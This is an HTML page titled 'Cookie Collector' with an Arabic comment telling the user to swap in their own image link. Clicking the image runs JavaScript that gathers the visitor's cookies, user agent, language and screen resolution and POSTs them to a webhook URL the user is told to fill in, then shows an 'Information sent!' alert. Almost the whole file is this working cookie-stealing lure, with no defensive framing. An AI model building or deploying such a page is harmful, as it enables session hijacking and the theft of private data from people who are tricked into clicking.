<!DOCTYPE html>
<html>
<head>
    <title>Cookie Collector</title>
    <style>
        body { text-align: center; }
        img { cursor: pointer; }
    </style>
</head>
<body>
    <h1>Click on the image</h1>
    <!-- استبدل رابط الصورة هنا -->
    <img src="https://i.imgur.com/example.jpg" width="300" onclick="sendCookies()" />

   <script>
    document.cookie = "test_cookie=123; path=/";
    document.cookie = "user_session=abcxyz; path=/";

    function sendCookies() {
        const cookies = document.cookie;
        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;

        if (!cookies) {
            alert("No cookies found!");
            return;
        }

        const webhookUrl = 'PUT_YOUR_WEBHOOK_HERE';

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `
Cookies:
${cookies}

User Agent:
${userAgent}

Language:
${language}

Screen Resolution:
${screenWidth}x${screenHeight}
                `
            })
        });

        alert("Information sent!");
    }
</script>
</body>
</html>
